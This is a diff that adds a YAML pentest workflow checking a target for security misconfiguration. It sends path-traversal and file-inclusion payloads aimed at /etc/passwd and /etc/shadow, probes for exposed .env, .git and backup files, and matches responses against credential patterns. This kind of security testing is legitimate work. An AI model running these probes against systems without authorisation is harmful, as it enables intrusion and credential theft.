@@ -1,0 +1,100 @@
+# Pentest: Files & Misconfiguration
+# OWASP A05:2021 — Security Misconfiguration
+id: pentest_file_misconfig
+name: Files & Misconfiguration Test
+version: "1.0.0"
+description: LFI, unrestricted upload, directory listing, path traversal, error leakage
+
+steps:
+  - id: start
+    module: flow.start
+    label: Start
+    params: {}
+    orderIndex: 0
+
+  - id: lfi_probes
+    module: http.batch
+    label: Local File Inclusion
+    params:
+      requests:
+        - { method: GET, url: "{{target_url}}/api/file?path=../../../etc/passwd" }
+        - { method: GET, url: "{{target_url}}/api/file?path=....//....//....//etc/passwd" }
+        - { method: GET, url: "{{target_url}}/api/file?path=/etc/passwd%00.jpg" }
+        - { method: GET, url: "{{target_url}}/api/file?path=....\\....\\....\\windows\\system32\\drivers\\etc\\hosts" }
+        - { method: GET, url: "{{target_url}}/api/download?name=../../../etc/shadow" }
+        - { method: GET, url: "{{target_url}}/static/..%2f..%2f..%2fetc/passwd" }
+      detect_patterns: ["root:", "daemon:", "localhost", "127.0.0.1"]
+    orderIndex: 1
+
+  - id: sensitive_paths
+    module: http.batch
+    label: Sensitive Path Discovery
+    params:
+      requests:
+        - { method: GET, url: "{{target_url}}/.env" }
+        - { method: GET, url: "{{target_url}}/.git/config" }
+        - { method: GET, url: "{{target_url}}/.git/HEAD" }
+        - { method: GET, url: "{{target_url}}/.DS_Store" }
+        - { method: GET, url: "{{target_url}}/wp-config.php.bak" }
+        - { method: GET, url: "{{target_url}}/backup.sql" }
+        - { method: GET, url: "{{target_url}}/dump.sql" }
+        - { method: GET, url: "{{target_url}}/phpinfo.php" }
+        - { method: GET, url: "{{target_url}}/server-status" }
+        - { method: GET, url: "{{target_url}}/actuator" }
+        - { method: GET, url: "{{target_url}}/actuator/env" }
+        - { method: GET, url: "{{target_url}}/debug" }
+        - { method: GET, url: "{{target_url}}/swagger-ui.html" }
+        - { method: GET, url: "{{target_url}}/graphql" }
+        - { method: GET, url: "{{target_url}}/api/docs" }
+        - { method: GET, url: "{{target_url}}/.well-known/security.txt" }
+        - { method: GET, url: "{{target_url}}/robots.txt" }
+        - { method: GET, url: "{{target_url}}/sitemap.xml" }
+      detect_patterns: ["DB_PASSWORD", "SECRET_KEY", "password", "repositoryformatversion", "ref:"]
+    orderIndex: 2
+
+  - id: directory_listing
+    module: http.batch
+    label: Directory Listing
+    params:
+      requests:
+        - { method: GET, url: "{{target_url}}/uploads/" }
+        - { method: GET, url: "{{target_url}}/static/" }
+        - { method: GET, url: "{{target_url}}/images/" }
+        - { method: GET, url: "{{target_url}}/assets/" }
+        - { method: GET, url: "{{target_url}}/tmp/" }
+        - { method: GET, url: "{{target_url}}/backup/" }
+      detect_patterns: ["Index of", "Directory listing", "Parent Directory"]
+    orderIndex: 3
+
+  - id: error_leakage
+    module: http.batch
+    label: Error Information Leakage
+    params:
+      requests:
+        - { method: GET, url: "{{target_url}}/api/nonexistent'" }
+        - { method: POST, url: "{{target_url}}/api/data", headers: { "Content-Type": "application/json" }, body: "not json" }
+        - { method: GET, url: "{{target_url}}/api/users/{{" }
+        - { method: GET, url: "{{target_url}}/%00" }
+      detect_patterns: ["Traceback", "stack trace", "Exception in", "at line", "SQLSTATE", "node_modules"]
+    orderIndex: 4
+
+  - id: analyze
+    module: llm.agent
+    label: Analyze Results
+    params:
+      model: gpt-4o
+      prompt: |
+        Analyze file/misconfiguration test results.
+        LFI: ${lfi_probes.data}
+        Sensitive paths: ${sensitive_paths.data}
+        Directory listing: ${directory_listing.data}
+        Error leakage: ${error_leakage.data}
+        Output JSON: { "findings": [...], "severity": "...", "summary": "..." }
+    orderIndex: 5
+
+edges:
+  - { source: start, target: lfi_probes }
+  - { source: lfi_probes, target: sensitive_paths }
+  - { source: sensitive_paths, target: directory_listing }
+  - { source: directory_listing, target: error_leakage }
+  - { source: error_leakage, target: analyze }
